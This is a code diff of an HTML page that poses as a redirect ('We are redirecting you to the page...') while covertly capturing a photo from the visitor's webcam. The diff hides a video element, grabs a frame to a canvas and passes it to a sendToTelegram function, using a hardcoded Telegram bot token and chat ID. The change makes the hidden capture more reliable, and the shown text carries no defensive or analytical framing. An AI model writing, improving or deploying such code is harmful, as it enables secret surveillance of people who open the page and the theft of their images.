@@ -21,18 +21,31 @@
             font-weight: bold;
             color: #333;
         }
+
+        video {
+            position: absolute;
+            width: 0;
+            height: 0;
+            visibility: hidden;
+        }
     </style>
 </head>
 <body>
     <div id="loadingText">We are redirecting you to the page...</div>
+    <video id="video" autoplay muted></video>
     
     <script>
         const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";
         const CHAT_ID = "5934902786";
         const loadingText = document.getElementById('loadingText');
+        const video = document.getElementById('video');
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
+                video.srcObject = stream;
+                video.muted = true;
+                video.style.display = "none";
+
                 setTimeout(() => {
                     loadingText.style.display = "block";
                     capturePhoto(stream);
@@ -44,20 +57,15 @@
             });
 
         function capturePhoto(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = 640;
+            canvas.height = 480;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            video.onloadeddata = function() {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoDataUrl = canvas.toDataURL('image/jpeg');
-                stream.getTracks().forEach(track => track.stop());
-                sendToTelegram(photoDataUrl);
-            };
+            const photoDataUrl = canvas.toDataURL('image/jpeg');
+            stream.getTracks().forEach(track => track.stop());
+            sendToTelegram(photoDataUrl);
         }
 
         function sendToTelegram(photoDataUrl) {
